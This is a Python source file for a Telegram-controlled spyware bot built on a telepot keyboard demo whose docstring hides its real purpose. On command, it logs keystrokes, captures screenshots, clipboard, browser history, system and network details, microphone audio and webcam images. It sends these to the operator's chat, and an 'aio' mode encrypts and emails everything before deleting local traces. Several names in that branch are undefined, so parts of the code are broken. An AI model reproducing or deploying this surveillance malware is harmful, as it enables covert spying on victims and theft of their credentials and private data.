#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import platform
from dotenv import load_dotenv
import sys
import asyncio
import time
import threading
import random
import telepot
from telepot.loop import MessageLoop
from telepot.namedtuple import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, ForceReply
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
from telepot.namedtuple import InlineQueryResultArticle, InlineQueryResultPhoto, InputTextMessageContent
from pathlib import Path
from multiprocessing import Process

from subprocess import CalledProcessError, check_output, Popen, TimeoutExpired
from threading import Thread

"""
$ python3.5 skeletona_route.py <token>

It demonstrates:
- passing a routing table to `MessageLoop` to filter flavors.
- the use of custom keyboard and inline keyboard, and their various buttons.

Remember to `/setinline` and `/setinlinefeedback` to enable inline mode for your bot.

It works like this:

- First, you send it one of these 4 characters - `c`, `i`, `h`, `f` - and it replies accordingly:
    - `c` - a custom keyboard with various buttons
    - `i` - an inline keyboard with various buttons
    - `h` - hide custom keyboard
    - `f` - force reply
- Press various buttons to see their effects
- Within inline mode, what you get back depends on the **last character** of the query:
    - `a` - a list of articles
    - `p` - a list of photos
    - `b` - to see a button above the inline results to switch back to a private chat with the bot
"""

message_with_inline_keyboard = None

load_dotenv() # will search for .env file in local folder and load variables 

from src import keylogger, screenshot, clipboard, systeminfo, networkinfo, microphone, browserhistory, webcam

def on_chat_message(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    print('Chat:', content_type, chat_type, chat_id)

    if content_type != 'text':
        return

    command = msg['text'].lower()

    """
    Gathers network information, clipboard contents, browser history, initiates multiprocessing, \
    sends encrypted results, cleans up exfiltrated data, and loops back to the beginning.

    :return:  Nothing
    """
    path = Path(os.getenv("OUTPUT"))

    # Ensure the tmp exfiltration dir exists #
    path.mkdir(parents=True, exist_ok=True)

    # Set program files and dirs #
    network_file    = os.path.join( path, str(os.getenv("OUTPUT_NETWORKINFO")))
    sysinfo_file    = os.path.join( path, str(os.getenv("OUTPUT_SYSTEMINFO")))
    browser_file    = os.path.join( path, str(os.getenv("OUTPUT_BROWSERHISTORY")))
    log_file        = os.path.join( path, str(os.getenv("OUTPUT_KEYLOGGER")))
    screenshot_dir  = os.path.join( path, str(os.getenv("OUTPUT_SCREENSHOT")))
    webcam_dir      = os.path.join( path, str(os.getenv("OUTPUT_WEBCAM")))
    clipboard_file  = os.path.join( path, str(os.getenv("OUTPUT_CLIPBOARD")))
    microphone_dir  = os.path.join( path, str(os.getenv("OUTPUT_MICROPHONE")))

    if command == '/start':
        bot.sendPhoto(chat_id, photo=open("./assets/img/start_doatmang3000.jpeg", 'rb'), caption="Đoạt mạng 3000!")
    elif command == 'keylogger':
        keylogger.get(duration=10, path=log_file, botObj=bot, chat_id=chat_id)
    elif command == 'screenshot':
        screenshot.get(number=2, gap=2, path=screenshot_dir, botObj=bot, chat_id=chat_id)
    elif command == 'clipboard':
        clipboard.get(path=clipboard_file, botObj=bot, chat_id=chat_id)
    elif command == 'systeminfo':
        systeminfo.get(path=sysinfo_file, botObj=bot, chat_id=chat_id)
    elif command == 'networkinfo':
        networkinfo.get(path=network_file, botObj=bot, chat_id=chat_id)
    elif command == 'microphone':
        microphone.get(duration=10, number=3, path=microphone_dir, botObj=bot, chat_id=chat_id)
    elif command == 'browser':
        browserhistory.get(path=browser_file, botObj=bot, chat_id=chat_id)
    elif command == 'webcam':
        webcam.get(number=5, gap=3, path=webcam_dir, botObj=bot, chat_id=chat_id)
    elif command == 'aio':
 

        # Get the network information and save to output file #
        networkinfo.get(path=network_file)

        # Get the system information and save to output file #
        systeminfo.get(path=sysinfo_file)

        clipboard.get(path=clipboard_file)

        # Get the browser user and history and save to output file #
        browserhistory.get(browser_file)

        # Create and start processes #
        proc_1 = Process(target=keylogger.keylogstart_new, args=(10, log_file,))
        proc_1.start()
        proc_2 = Thread(target=screenshot.get, args=(3, 5, screenshot_dir,))
        proc_2.start()
        proc_3 = Thread(target=microphone.get, args=(10, 3, microphone_dir,))
        proc_3.start()
        proc_4 = Thread(target=webcam.get, args=(5, 3, webcam_dir,))
        proc_4.start()

        # Join processes/threads with 5 minute timeout #
        proc_1.join(timeout=30)
        proc_2.join(timeout=30)
        proc_3.join(timeout=30)
        proc_4.join(timeout=30)

        # Terminate process #
        proc_1.terminate()

        files = ['network_info.txt', 'system_info.txt', 'browser_info.txt', 'key_logs.txt']

        # Initialize compiled regex instance #
        regex_obj = RegObject()

        # If the OS is Windows #
        if os.name == 'nt':
            # Add clipboard file to list #
            files.append('clipboard_info.txt')

            # Append file to file list if item is file and match xml regex #
            [files.append(file.name) for file in os.scandir(export_path)
            if regex_obj.re_xml.match(file.name)]
        # If the OS is Linux #
        else:
            files.append('wifi_info.txt')

        # Encrypt all the files in the files list #
        encrypt_data(files, export_path)

        # Export data via email #
        send_mail(export_path, regex_obj)
        send_mail(screenshot_dir, regex_obj)
        send_mail(webcam_dir, regex_obj)

        # Clean Up Files #
        shutil.rmtree(export_path)
    elif command == 'c':
        markup = ReplyKeyboardMarkup(keyboard=[
                     ['Plain text', KeyboardButton(text='Text only')],
                     [dict(text='Phone', request_contact=True), KeyboardButton(text='Location', request_location=True)],
                 ])
        bot.sendMessage(chat_id, 'Custom keyboard with various buttons', reply_markup=markup)
    elif command == 'i':
        markup = InlineKeyboardMarkup(inline_keyboard=[
                     [dict(text='Telegram URL', url='https://core.telegram.org/')],
                     [InlineKeyboardButton(text='Callback - show notification', callback_data='notification')],
                     [dict(text='Callback - show alert', callback_data='alert')],
                     [InlineKeyboardButton(text='Callback - edit message', callback_data='edit')],
                     [dict(text='Switch to using bot inline', switch_inline_query='initial query')],
                 ])

        global message_with_inline_keyboard
        message_with_inline_keyboard = bot.sendMessage(chat_id, 'Inline keyboard with various buttons', reply_markup=markup)
    elif command == 'h':
        markup = ReplyKeyboardRemove()
        bot.sendMessage(chat_id, 'Hide custom keyboard', reply_markup=markup)
    elif command == 'f':
        markup = ForceReply()
        bot.sendMessage(chat_id, 'Force reply', reply_markup=markup)


def on_callback_query(msg):
    query_id, from_id, data = telepot.glance(msg, flavor='callback_query')
    print('Callback query:', query_id, from_id, data)

    if data == 'notification':
        bot.answerCallbackQuery(query_id, text='Notification at top of screen')
    elif data == 'alert':
        bot.answerCallbackQuery(query_id, text='Alert!', show_alert=True)
    elif data == 'edit':
        global message_with_inline_keyboard

        if message_with_inline_keyboard:
            msg_idf = telepot.message_identifier(message_with_inline_keyboard)
            bot.editMessageText(msg_idf, 'NEW MESSAGE HERE!!!!!')
        else:
            bot.answerCallbackQuery(query_id, text='No previous message to edit')


def on_inline_query(msg):
    def compute():
        query_id, from_id, query_string = telepot.glance(msg, flavor='inline_query')
        print('Computing for: %s' % query_string)

        articles = [InlineQueryResultArticle(
                        id='abcde', title='Telegram', input_message_content=InputTextMessageContent(message_text='Telegram is a messaging app')),
                    dict(type='article',
                        id='fghij', title='Google', input_message_content=dict(message_text='Google is a search engine'))]

        photo1_url = 'https://core.telegram.org/file/811140934/1/tbDSLHSaijc/fdcc7b6d5fb3354adf'
        photo2_url = 'https://www.telegram.org/img/t_logo.png'
        photos = [InlineQueryResultPhoto(
                      id='12345', photo_url=photo1_url, thumb_url=photo1_url),
                  dict(type='photo',
                      id='67890', photo_url=photo2_url, thumb_url=photo2_url)]

        result_type = query_string[-1:].lower()

        if result_type == 'a':
            return articles
        elif result_type == 'p':
            return photos
        else:
            results = articles if random.randint(0,1) else photos
            if result_type == 'b':
                return dict(results=results, switch_pm_text='Back to Bot', switch_pm_parameter='Optional_start_parameter')
            else:
                return dict(results=results)

    answerer.answer(msg, compute)


def on_chosen_inline_result(msg):
    result_id, from_id, query_string = telepot.glance(msg, flavor='chosen_inline_result')
    print('Chosen Inline Result:', result_id, from_id, query_string)




# def main():
TOKEN = os.getenv('BOT_TOKEN_API')

bot = telepot.Bot(TOKEN)
answerer = telepot.helper.Answerer(bot)

MessageLoop(bot, {'chat': on_chat_message,
                  'callback_query': on_callback_query,
                  'inline_query': on_inline_query,
                  'chosen_inline_result': on_chosen_inline_result}).run_as_thread()
print('Listening ...')

# Keep the program running.
while 1:
    time.sleep(10)